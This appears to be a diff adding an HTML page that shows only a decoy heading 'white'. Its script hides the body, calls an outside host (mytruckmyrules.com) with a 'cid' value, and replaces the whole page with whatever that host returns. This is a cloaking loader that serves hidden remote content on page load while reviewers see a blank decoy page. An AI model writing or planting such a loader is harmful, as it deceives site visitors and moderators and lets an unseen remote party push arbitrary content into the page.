@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+
+
+<script id="4203">
+
+
+        function getQueryVariable(variable) {
+            var query = window.location.search.substring(1);
+            var vars = query.split("&");
+            for (var i=0;i<vars.length;i++) {
+                var pair = vars[i].split("=");
+                if(pair[0] == variable){return pair[1];}
+            }
+            return(false);
+        }
+
+
+
+        style = document.createElement('style');
+        style.innerText = 'body{display:none;}';
+        document.head.appendChild(style);
+
+
+
+        $cid = getQueryVariable('cid') ? getQueryVariable('cid') : document.currentScript.getAttribute('id');
+
+        var url = 'https://mytruckmyrules.com?cid=' + $cid;
+        var xhr = new XMLHttpRequest();
+
+
+        xhr.withCredentials = false;
+        xhr.open("GET", url, true);
+        xhr.send();
+        xhr.onload = function() {
+
+            if (xhr.status === 200) {
+                if(xhr.responseText) {
+                    document.open();
+                    document.write(xhr.responseText);
+                    document.close();
+                    return;
+
+                } else {style.remove()}
+
+            } else {style.remove()}
+
+        };
+
+        xhr.onerror = function() {
+            style.remove()
+            document.currentScript.remove()
+        };
+
+</script>
+
+
+</head>
+<body>
+    <h1>white</h1>
+</body>
+</html>
